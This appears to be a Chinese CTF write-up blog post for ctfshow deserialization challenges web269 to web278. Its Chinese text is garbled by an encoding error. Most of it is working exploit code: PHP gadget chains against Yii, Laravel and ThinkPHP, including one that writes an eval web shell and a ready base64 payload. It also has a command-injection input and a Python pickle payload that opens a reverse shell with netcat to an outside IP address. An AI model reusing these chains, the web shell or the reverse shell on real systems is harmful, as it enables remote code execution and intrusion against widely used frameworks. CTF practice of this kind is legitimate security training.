<h2 id="web269ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"><a href="#web269ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰" class="headerlink" title="web269ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"></a>web269ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰</h2><p>ä¸Šè¿°é‚£ä¸ªé“¾å­ä¹Ÿä¸è¡Œäº†ï¼Œä»ç½‘ä¸Šæ‰¾äº†ä¸€æ¡æ–°é“¾å­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">namespace yii\rest &#123;</span><br><span class="line">    class Action</span><br><span class="line">    &#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">    &#125;</span><br><span class="line">    class IndexAction</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;checkAccess = $func;</span><br><span class="line">            $this-&gt;id = $param;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\web &#123;</span><br><span class="line">    abstract class MultiFieldSession</span><br><span class="line">    &#123;</span><br><span class="line">        public $writeCallback;</span><br><span class="line">    &#125;</span><br><span class="line">    class DbSession extends MultiFieldSession</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;writeCallback = [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\db &#123;</span><br><span class="line">    use yii\base\BaseObject;</span><br><span class="line">    class BatchQueryResult</span><br><span class="line">    &#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_dataReader = new \yii\web\DbSession($func, $param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace &#123;</span><br><span class="line">    $exp = new \yii\db\BatchQueryResult(&#x27;shell_exec&#x27;, &quot;echo &#x27;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&#x27; &gt; /var/www/html/basic/web/2.php&quot;);</span><br><span class="line">    echo(base64_encode(serialize($exp)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web270ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"><a href="#web270ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰" class="headerlink" title="web270ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"></a>web270ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰</h2><p>ç›´æ¥ç”¨269çš„é“¾å­è¿˜å¯ä»¥ã€‚</p>
<h2 id="web271ï¼ˆlavaralååºåˆ—åŒ–æ¼æ´ï¼‰"><a href="#web271ï¼ˆlavaralååºåˆ—åŒ–æ¼æ´ï¼‰" class="headerlink" title="web271ï¼ˆlavaralååºåˆ—åŒ–æ¼æ´ï¼‰"></a>web271ï¼ˆlavaralååºåˆ—åŒ–æ¼æ´ï¼‰</h2><p>æ‰¾äº†è¿™ä¸ªé“¾å­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">namespace Illuminate\Broadcasting &#123;</span><br><span class="line">    class PendingBroadcast &#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line">        function __construct($evilCode)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;events = new \Illuminate\Bus\Dispatcher();</span><br><span class="line">            $this-&gt;event = new BroadcastEvent($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  class BroadcastEvent &#123;</span><br><span class="line">        public $connection;</span><br><span class="line">        function __construct($evilCode)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;connection = new \Mockery\Generator\MockDefinition($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Bus &#123;</span><br><span class="line">    class Dispatcher &#123;</span><br><span class="line">        protected $queueResolver;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;queueResolver = [new \Mockery\Loader\EvalLoader(), &#x27;load&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Mockery\Loader &#123;</span><br><span class="line">    class EvalLoader &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Mockery\Generator &#123;</span><br><span class="line">    class MockDefinition &#123;</span><br><span class="line">        protected $config;</span><br><span class="line">        protected $code;</span><br><span class="line">        function __construct($evilCode)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;code = $evilCode;</span><br><span class="line">            $this-&gt;config = new MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class MockConfiguration &#123;</span><br><span class="line">        protected $name = &#x27;abcdefg&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">  $code = &quot;&lt;?php system(&#x27;cat /flag&#x27;); exit; ?&gt;&quot;;;</span><br><span class="line">  $exp = new \Illuminate\Broadcasting\PendingBroadcast($code);</span><br><span class="line">  echo urlencode(serialize($exp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web272"><a href="#web272" class="headerlink" title="web272"></a>web272</h2><p>åŒä¸Š</p>
<h2 id="web273"><a href="#web273" class="headerlink" title="web273"></a>web273</h2><p>åŒä¸Š</p>
<h2 id="web274ï¼ˆthinkphpï¼‰"><a href="#web274ï¼ˆthinkphpï¼‰" class="headerlink" title="web274ï¼ˆthinkphpï¼‰"></a>web274ï¼ˆthinkphpï¼‰</h2><p>thinkphpç°åœ¨æ¯”èµ›å¥½å°‘è§çš„èº«å½±ï¼Œå»å¹´æˆ‘æ˜¯èŒæ–°æ—¶å¤©å¤©è§ã€‚</p>
<p>æ‰¾ä¸€æ¡é“¾å­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">namespace think;</span><br><span class="line">class Request&#123;</span><br><span class="line">    protected $hook = [];</span><br><span class="line">    protected $filter = &quot;system&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;filter = &quot;system&quot;;</span><br><span class="line">        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;huha&#x27;];</span><br><span class="line">        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    private $data = [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        # appendé”®å¿…é¡»å­˜åœ¨ï¼Œå¹¶ä¸”ä¸$this-&gt;dataç›¸åŒ</span><br><span class="line">        $this-&gt;append = [&quot;huha&quot;=&gt;[]];</span><br><span class="line">        $this-&gt;data = [&quot;huha&quot;=&gt;new Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line"></span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files=[new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//var_dump(new Windows());</span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br></pre></td></tr></table></figure>

<p>expï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJodWhhIjthOjA6e319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJodWhhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjc7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo2OiJjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czo0OiJodWhhIjt9fX19fX0=&amp;huha[]=tac /flag</span><br></pre></td></tr></table></figure>

<h2 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class filter&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $filecontent;</span><br><span class="line">    public $evilfile=false;</span><br><span class="line"></span><br><span class="line">    public function __construct($f,$fn)&#123;</span><br><span class="line">        $this-&gt;filename=$f;</span><br><span class="line">        $this-&gt;filecontent=$fn;</span><br><span class="line">    &#125;</span><br><span class="line">    public function checkevil()&#123;</span><br><span class="line">        if(preg_match(&#x27;/php|\.\./i&#x27;, $this-&gt;filename))&#123;</span><br><span class="line">            $this-&gt;evilfile=true;</span><br><span class="line">        &#125;</span><br><span class="line">        if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;</span><br><span class="line">            $this-&gt;evilfile=true;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;evilfile)&#123;</span><br><span class="line">            system(&#x27;rm &#x27;.$this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;fn&#x27;]))&#123;</span><br><span class="line">    $content = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">    $f = new filter($_GET[&#x27;fn&#x27;],$content);</span><br><span class="line">    if($f-&gt;checkevil()===false)&#123;</span><br><span class="line">        file_put_contents($_GET[&#x27;fn&#x27;], $content);</span><br><span class="line">        copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);</span><br><span class="line">        unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);</span><br><span class="line">        echo &#x27;work done&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;where is flag?&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰ç‚¹å¥½ç©ï¼Œä»–å¼•å…¥äº†systemè¿™ä¸ªå‡½æ•°ï¼Œç„¶åå‘ç°ç›´æ¥å¯ä»¥rceäº†</p>
<p>ä¼ fn=1.html;id</p>
<h2 id="web277-python-ååºåˆ—åŒ–"><a href="#web277-python-ååºåˆ—åŒ–" class="headerlink" title="web277(python ååºåˆ—åŒ–)"></a>web277(python ååºåˆ—åŒ–)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where is flag?&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span><br></pre></td></tr></table></figure>

<p>ä»è¿™æ®µä»£ç èƒ½çœ‹å‡ºæ—¶pythonåºåˆ—åŒ–ä¸”å­˜åœ¨ååºåˆ—åŒ–çš„æ¼æ´</p>
<h2 id="reduce-ä»‹ç»"><a href="#reduce-ä»‹ç»" class="headerlink" title="_reduce_()ä»‹ç»"></a>_<em>reduce</em>_()ä»‹ç»</h2><p>å½“å®šä¹‰æ‰©å±•ç±»å‹æ—¶ï¼ˆä¹Ÿå°±æ˜¯ä½¿ç”¨Pythonçš„Cè¯­è¨€APIå®ç°çš„ç±»å‹ï¼‰ï¼Œå¦‚æœä½ æƒ³pickleå®ƒä»¬ï¼Œä½ å¿…é¡»å‘Šè¯‰Pythonå¦‚ä½•pickleå®ƒä»¬ã€‚ <strong>reduce</strong> è¢«å®šä¹‰ä¹‹åï¼Œå½“å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨ã€‚å®ƒè¦ä¹ˆè¿”å›ä¸€ä¸ªä»£è¡¨å…¨å±€åç§°çš„å­—ç¬¦ä¸²ï¼ŒPyhtonä¼šæŸ¥æ‰¾å®ƒå¹¶pickleï¼Œè¦ä¹ˆè¿”å›ä¸€ä¸ªå…ƒç»„ã€‚è¿™ä¸ªå…ƒç»„åŒ…å«2åˆ°5ä¸ªå…ƒç´ ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼šä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç”¨äºé‡å»ºå¯¹è±¡æ—¶è°ƒç”¨ï¼›ä¸€ä¸ªå‚æ•°å…ƒç´ ï¼Œä¾›é‚£ä¸ªå¯è°ƒç”¨å¯¹è±¡ä½¿ç”¨ï¼›è¢«ä¼ é€’ç»™ <strong>setstate</strong> çš„çŠ¶æ€ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„åˆ—è¡¨å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„å­—å…¸å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰</p>
<p>å› æ­¤åˆ©ç”¨æ­¤æ¥æ„é€ åºåˆ—åŒ–ï¼Œç„¶åæ‹¿flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">class CTFshow():</span><br><span class="line">    def sw(self):</span><br><span class="line">        print(self.show)</span><br><span class="line">    def __init__(self,show):</span><br><span class="line">        self.show=show</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc 101.42.138.249 6666 -e /bin/sh&#x27;).read()&quot;,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cs = CTFshow(&quot;http://6122e189-3fb6-45a2-b099-aeb0071f1ddd.challenge.ctf.show/&quot;)</span><br><span class="line"></span><br><span class="line">ctfshow_usr= pickle.dumps(cs)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode((ctfshow_usr)))</span><br></pre></td></tr></table></figure>

<p>ä¼ å‚</p>
<p><img src="https://img-blog.csdnimg.cn/fcff2675c6124532831899a8d6cb09c9.png" alt="img"></p>
<p>æˆåŠŸæ‰§è¡Œï¼Œåå¼¹shell åç›´æ¥æ‹¿flag</p>
<p><img src="https://img-blog.csdnimg.cn/35c041ee6fa541a49b0fb6fc30c077fb.png" alt="img"></p>
<h2 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h2><p>æ–¹æ³•åŒä¸Šã€‚</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:xy_404@163.com">é‘«ç¼˜</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://websec.space/2022/03/12/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://websec.space/2022/03/12/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://websec.space/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://websec.space" target="_blank">Xinyuan's blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post_share"><div class="social-share" data-image="https://img-blog.csdnimg.cn/9164d2cb2f204f6cba75611a0dc18c68.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/03/15/ctfshow%20java/"><img class="prev-cover" src="https://img-blog.csdnimg.cn/ceb30b7e1c3d4d65b36623ae98514ea5.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">ctfshow java</div></div></a></div><div class="next-post pull-right"><a href="/2022/02/24/%E6%B5%85%E8%81%8A%E4%B8%80%E4%B8%8B%E6%96%87%E5%8C%96%E8%AF%BE%E5%92%8C%E6%8A%80%E6%9C%AF%E7%9A%84%E5%85%B3%E7%B3%BB/"><img class="next-cover" src="https://img-blog.csdnimg.cn/e735da61c16f40b3aa5ee6caa3b0a705.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">æµ…èŠ</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/2022/01/07/%E8%90%8C%E6%96%B0%E9%A2%98wp/" title="èŒæ–°é¢˜wp(ä¸Šç¯‡)"><img class="cover" src="https://img-blog.csdnimg.cn/3f38cfec623e4b28946a037c02aca0ca.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-07</div><div class="title">èŒæ–°é¢˜wp(ä¸Šç¯‡)</div></div></a></div><div><a href="/2022/01/25/ctfshow%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="webå…¥é—¨ä¹‹ä¿¡æ¯æœé›†"><img class="cover" src="https://img-blog.csdnimg.cn/ba56d9eb6f0440f3b127a393bc675c26.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-25</div><div class="title">webå…¥é—¨ä¹‹ä¿¡æ¯æœé›†</div></div></a></div><div><a href="/2022/01/26/ctfshow%E7%88%86%E7%A0%B4/" title="ctfshowçˆ†ç ´"><img class="cover" src="https://img-blog.csdnimg.cn/06dabe6cd15e4cfea6956667507aa4eb.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-26</div><div class="title">ctfshowçˆ†ç ´</div></div></a></div><div><a href="/2022/01/29/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="ctfshowå‘½ä»¤æ‰§è¡Œ"><img class="cover" src="https://img-blog.csdnimg.cn/64c933a6fcac4e1f973bc8af56fc4541.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-29</div><div class="title">ctfshowå‘½ä»¤æ‰§è¡Œ</div></div></a></div><div><a href="/2022/02/04/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="webå®‰å…¨ä¹‹å‘½ä»¤æ‰§è¡Œ"><img class="cover" src="https://img-blog.csdnimg.cn/0c25821093484753888d91bb598e871b.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-04</div><div class="title">webå®‰å…¨ä¹‹å‘½ä»¤æ‰§è¡Œ</div></div></a></div><div><a href="/2022/02/06/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="ctfshowæ–‡ä»¶åŒ…å«"><img class="cover" src="https://img-blog.csdnimg.cn/67ff483229f34d019237230a4b76a342.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-06</div><div class="title">ctfshowæ–‡ä»¶åŒ…å«</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> è¯„è®º</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">é‘«ç¼˜</div><div class="author-info__description">ç©¹é•œSkyMirror æˆå‘˜ï¼Œå®‰å…¨æ–¹å‘çˆ±å¥½è€…</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">38</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">6</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xinyuan-404"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xinyuan-404" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:xy_404@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>å…¬å‘Š</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">ctfshowååºåˆ—åŒ–</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web254"><span class="toc-number">1.1.</span> <span class="toc-text">web254</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web255"><span class="toc-number">1.2.</span> <span class="toc-text">web255</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web256"><span class="toc-number">1.3.</span> <span class="toc-text">web256</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web257"><span class="toc-number">1.4.</span> <span class="toc-text">web257</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web258"><span class="toc-number">1.5.</span> <span class="toc-text">web258</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web259-call"><span class="toc-number">1.6.</span> <span class="toc-text">web259(__call())</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web260"><span class="toc-number">1.7.</span> <span class="toc-text">web260</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web261"><span class="toc-number">1.8.</span> <span class="toc-text">web261</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web262-%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">1.9.</span> <span class="toc-text">web262(å­—ç¬¦é€ƒé€¸)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web263"><span class="toc-number">1.10.</span> <span class="toc-text">web263</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web264"><span class="toc-number">1.11.</span> <span class="toc-text">web264</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web265"><span class="toc-number">1.12.</span> <span class="toc-text">web265</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web266%E2%80%93PHP%E5%AF%B9%E7%B1%BB%E5%90%8D%E7%9A%84%E5%A4%A7%E5%B0%8F%E5%86%99%E4%B8%8D%E6%95%8F%E6%84%9F"><span class="toc-number">1.13.</span> <span class="toc-text">web266â€“PHPå¯¹ç±»åçš„å¤§å°å†™ä¸æ•æ„Ÿ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 